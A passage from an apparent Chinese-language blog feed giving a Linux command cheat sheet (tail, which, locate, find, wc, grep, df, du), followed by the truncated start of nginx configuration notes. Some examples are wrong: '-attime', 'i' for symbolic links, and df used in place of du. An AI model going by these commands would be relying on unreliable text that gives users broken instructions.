&lt;td&gt;-c&amp;lt;字节&amp;gt;&lt;/td&gt;
&lt;td&gt;显示的字节数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n&amp;lt;行数&amp;gt;&lt;/td&gt;
&lt;td&gt;显示行数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-11&quot;&gt;&lt;a href=&quot;#示例-11&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ tail -n 5 nginx.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ tail &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; catalina.out&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;which&quot;&gt;&lt;a href=&quot;#which&quot; class=&quot;headerlink&quot; title=&quot;which&quot;&gt;&lt;/a&gt;which&lt;/h3&gt;&lt;h4 id=&quot;查找可执行文件&quot;&gt;&lt;a href=&quot;#查找可执行文件&quot; class=&quot;headerlink&quot; title=&quot;查找可执行文件&quot;&gt;&lt;/a&gt;查找可执行文件&lt;/h4&gt;&lt;p&gt;格式: which 可执行文件名称&lt;/p&gt;
&lt;h4 id=&quot;示例-12&quot;&gt;&lt;a href=&quot;#示例-12&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;which&lt;/span&gt; gcc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;which&lt;/span&gt; ls&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;locate&quot;&gt;&lt;a href=&quot;#locate&quot; class=&quot;headerlink&quot; title=&quot;locate&quot;&gt;&lt;/a&gt;locate&lt;/h3&gt;&lt;h4 id=&quot;查找文件&quot;&gt;&lt;a href=&quot;#查找文件&quot; class=&quot;headerlink&quot; title=&quot;查找文件&quot;&gt;&lt;/a&gt;查找文件&lt;/h4&gt;&lt;p&gt;格式: locate [选项] [搜索字符串&lt;/p&gt;
&lt;p&gt;常用参数：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-q&lt;/td&gt;
&lt;td&gt;安静模式，不会显示任何错误讯息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n&lt;/td&gt;
&lt;td&gt;至多显示 n 个输出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-r&lt;/td&gt;
&lt;td&gt;使用正规表达式做寻找的条件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-V&lt;/td&gt;
&lt;td&gt;显示版本讯息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-13&quot;&gt;&lt;a href=&quot;#示例-13&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ locate /etc/cs*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;find&quot;&gt;&lt;a href=&quot;#find&quot; class=&quot;headerlink&quot; title=&quot;find&quot;&gt;&lt;/a&gt;find&lt;/h3&gt;&lt;h4 id=&quot;查找&quot;&gt;&lt;a href=&quot;#查找&quot; class=&quot;headerlink&quot; title=&quot;查找&quot;&gt;&lt;/a&gt;查找&lt;/h4&gt;&lt;p&gt;格式: find [选项] [搜索路径] [表达式]&lt;/p&gt;
&lt;p&gt;常用参数：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-print&lt;/td&gt;
&lt;td&gt;find 命令将匹配的文件输出到标准输出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-exec&lt;/td&gt;
&lt;td&gt;find 命令对匹配的文件执行该参数所给出的 shell 命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-name&lt;/td&gt;
&lt;td&gt;按照文件名查找文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-type&lt;/td&gt;
&lt;td&gt;查找某一类型的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-prune&lt;/td&gt;
&lt;td&gt;使用这一选项可以使 find 命令不在当前指定的目录中查找，如果同 时使用-depth 选项，那么-prune 将被 find 命令忽略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-user&lt;/td&gt;
&lt;td&gt;按照文件属主来查找文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-group&lt;/td&gt;
&lt;td&gt;按照文件所属的组来查找文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;名称或路径匹配示例&quot;&gt;&lt;a href=&quot;#名称或路径匹配示例&quot; class=&quot;headerlink&quot; title=&quot;名称或路径匹配示例&quot;&gt;&lt;/a&gt;名称或路径匹配示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find . -regex &lt;span class=&quot;string&quot;&gt;&quot;.*\(\.txt\|\.pdf\)$&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find . \( -name &lt;span class=&quot;string&quot;&gt;&quot;*.txt&quot;&lt;/span&gt; -o -name &lt;span class=&quot;string&quot;&gt;&quot;*.pdf&quot;&lt;/span&gt; \)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find /usr/ -path &lt;span class=&quot;string&quot;&gt;&quot;*local*&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;文件类型搜索示例&quot;&gt;&lt;a href=&quot;#文件类型搜索示例&quot; class=&quot;headerlink&quot; title=&quot;文件类型搜索示例&quot;&gt;&lt;/a&gt;文件类型搜索示例&lt;/h4&gt;&lt;p&gt;f 普通文件, i 符号连接, d 目录, c 字符设备, b 块设备, s 套接字, p Fifo&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find . -type f -mindepth 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;文件时间搜索&quot;&gt;&lt;a href=&quot;#文件时间搜索&quot; class=&quot;headerlink&quot; title=&quot;文件时间搜索&quot;&gt;&lt;/a&gt;文件时间搜索&lt;/h4&gt;&lt;p&gt;访问时间 -atime/天 -amin/分钟&lt;br&gt;修改时间 -mtime/天 -mmin/分钟&lt;br&gt;变化时间 -ctime/天 -cmin/分钟&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find . -type f -attime +7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find . -type f -amin -30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;文件大小搜索&quot;&gt;&lt;a href=&quot;#文件大小搜索&quot; class=&quot;headerlink&quot; title=&quot;文件大小搜索&quot;&gt;&lt;/a&gt;文件大小搜索&lt;/h4&gt;&lt;p&gt;b 块 c 字节 w 字 k 千字节 M 兆字节 G 吉字节&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find . -type f -size +10k&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;文件权限搜索&quot;&gt;&lt;a href=&quot;#文件权限搜索&quot; class=&quot;headerlink&quot; title=&quot;文件权限搜索&quot;&gt;&lt;/a&gt;文件权限搜索&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find . -type f -perm 777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;exec选项&quot;&gt;&lt;a href=&quot;#exec选项&quot; class=&quot;headerlink&quot; title=&quot;-exec选项&quot;&gt;&lt;/a&gt;-exec选项&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;find . -type f -mtime +30 -name &lt;span class=&quot;string&quot;&gt;&quot;*.log&quot;&lt;/span&gt; -exec cp &amp;#123;&amp;#125; old \;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;wc&quot;&gt;&lt;a href=&quot;#wc&quot; class=&quot;headerlink&quot; title=&quot;wc&quot;&gt;&lt;/a&gt;wc&lt;/h3&gt;&lt;h4 id=&quot;统计&quot;&gt;&lt;a href=&quot;#统计&quot; class=&quot;headerlink&quot; title=&quot;统计&quot;&gt;&lt;/a&gt;统计&lt;/h4&gt;&lt;p&gt;格式: wc [选项] [文件]&lt;/p&gt;
&lt;p&gt;常用参数：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-c&lt;/td&gt;
&lt;td&gt;统计字节数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-l&lt;/td&gt;
&lt;td&gt;统计行数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-m&lt;/td&gt;
&lt;td&gt;统计字符数，这个标志不能与 -c 标志一起使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-w&lt;/td&gt;
&lt;td&gt;统计字数，一个字被定义为由空白、跳格或换行字符分隔的字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-L&lt;/td&gt;
&lt;td&gt;打印最长行的长度&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-14&quot;&gt;&lt;a href=&quot;#示例-14&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ wc -c c.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ cat test.txt | wc &lt;span class=&quot;_&quot;&gt;-l&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;grep&quot;&gt;&lt;a href=&quot;#grep&quot; class=&quot;headerlink&quot; title=&quot;grep&quot;&gt;&lt;/a&gt;grep&lt;/h3&gt;&lt;h4 id=&quot;内容匹配&quot;&gt;&lt;a href=&quot;#内容匹配&quot; class=&quot;headerlink&quot; title=&quot;内容匹配&quot;&gt;&lt;/a&gt;内容匹配&lt;/h4&gt;&lt;p&gt;格式: grep [选项] pattern [file]&lt;/p&gt;
&lt;p&gt;常用参数：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-c&lt;/td&gt;
&lt;td&gt;计算找到 ‘搜寻字符串’(即 pattern) 的次数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;忽略大小写的不同，所以大小写视为相同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-n&lt;/td&gt;
&lt;td&gt;输出行号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;反向选择，打印不匹配的行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-r&lt;/td&gt;
&lt;td&gt;递归搜索&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;–color=auto&lt;/td&gt;
&lt;td&gt;将找到的关键词部分加上颜色显示&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-15&quot;&gt;&lt;a href=&quot;#示例-15&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ grep &lt;span class=&quot;string&quot;&gt;&quot;root&quot;&lt;/span&gt; /etc/passwd --color=auto&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ps -ef | grep tomcat&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;df&quot;&gt;&lt;a href=&quot;#df&quot; class=&quot;headerlink&quot; title=&quot;df&quot;&gt;&lt;/a&gt;df&lt;/h3&gt;&lt;h4 id=&quot;磁盘空间占用情况查看&quot;&gt;&lt;a href=&quot;#磁盘空间占用情况查看&quot; class=&quot;headerlink&quot; title=&quot;磁盘空间占用情况查看&quot;&gt;&lt;/a&gt;磁盘空间占用情况查看&lt;/h4&gt;&lt;p&gt;格式: df [选项]&lt;/p&gt;
&lt;p&gt;常用参数：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-a&lt;/td&gt;
&lt;td&gt;全部文件系统列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;方便阅读方式显示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-i&lt;/td&gt;
&lt;td&gt;显示 inode 信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-T&lt;/td&gt;
&lt;td&gt;文件系统类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-t&amp;lt;文件系统类型&amp;gt;&lt;/td&gt;
&lt;td&gt;只显示选定文件系统的磁盘信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-x&amp;lt;文件系统类型&amp;gt;&lt;/td&gt;
&lt;td&gt;不显示选定文件系统的磁盘信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-16&quot;&gt;&lt;a href=&quot;#示例-16&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ df -i&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ df -t ext4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;du&quot;&gt;&lt;a href=&quot;#du&quot; class=&quot;headerlink&quot; title=&quot;du&quot;&gt;&lt;/a&gt;du&lt;/h3&gt;&lt;h4 id=&quot;文件空间占用情况查看&quot;&gt;&lt;a href=&quot;#文件空间占用情况查看&quot; class=&quot;headerlink&quot; title=&quot;文件空间占用情况查看&quot;&gt;&lt;/a&gt;文件空间占用情况查看&lt;/h4&gt;&lt;p&gt;格式: df [选项] 文件&lt;/p&gt;
&lt;p&gt;常用参数：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-a&lt;/td&gt;
&lt;td&gt;显示目录中个别文件的大小。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-b&lt;/td&gt;
&lt;td&gt;显示目录或文件大小时，以 byte 为单位。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-c&lt;/td&gt;
&lt;td&gt;除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-k&lt;/td&gt;
&lt;td&gt;以 KB(1024bytes)为单位输出。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-m&lt;/td&gt;
&lt;td&gt;以 MB 为单位输出。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-s&lt;/td&gt;
&lt;td&gt;仅显示总计，只列出最后加总的值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-h&lt;/td&gt;
&lt;td&gt;以 K，M，G 为单位，提高信息的可读&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;示例-17&quot;&gt;&lt;a href=&quot;#示例-17&quot; class=&quot;headerlink&quot; title=&quot;示例&quot;&gt;&lt;/a&gt;示例&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ du -h desktop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ df -h nginx.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;目录及文件操作&quot;&gt;&lt;a href=&quot;#目录及文件操作&quot; class=&quot;headerlink&quot; title=&quot;目录及文件操作&quot;&gt;&lt;/a&gt;目录及文件操作&lt;/h2&gt;&lt;h3 id=&quot;ls&quot;&gt;&lt;a href=&quot;#ls&quot; class=&quot;headerlink&quot; title=&quot;l
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>nginx 速记1</title>
    <link href="http://binyanbin.github.io/2016/09/10/nginx-1/"/>
    <id>http://binyanbin.github.io/2016/09/10/nginx-1/</id>
    <published>2016-09-09T16:00:00.000Z</published>
    <updated>2016-09-09T17:14:10.000Z</updated>
    
    <content type="html">&lt;p&gt;示例:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	log_format upstream_time &amp;apos;$remote_addr - $remote_user [$time_local] &amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                             &amp;apos;&amp;quot;$request&amp;quot; $status $body_bytes_sent &amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                             &amp;apos;&amp;quot;$http_referer&amp;quot; &amp;quot;$http_user_agent&amp;quot;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                             &amp;apos;rt=$request_time uct=&amp;quot;$upstream_connect_time&amp;quot; uht=&amp;quot;$upstream_header_time&amp;quot; urt=&amp;quot;$upstream_response_time&amp;quot;&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    server &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	access_log /spool/logs/nginx-access.log upstream_time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	error_log logs/error.log warn;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		listen 80 backlog 4096;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		server_name example.org www.example.org;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		location /images/ &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        	root /data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        	index index.html;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        	sendfile   on;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		tcp_nopush on;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	location ~ \.php &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_set_header Host $host;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_set_header X-Real-IP 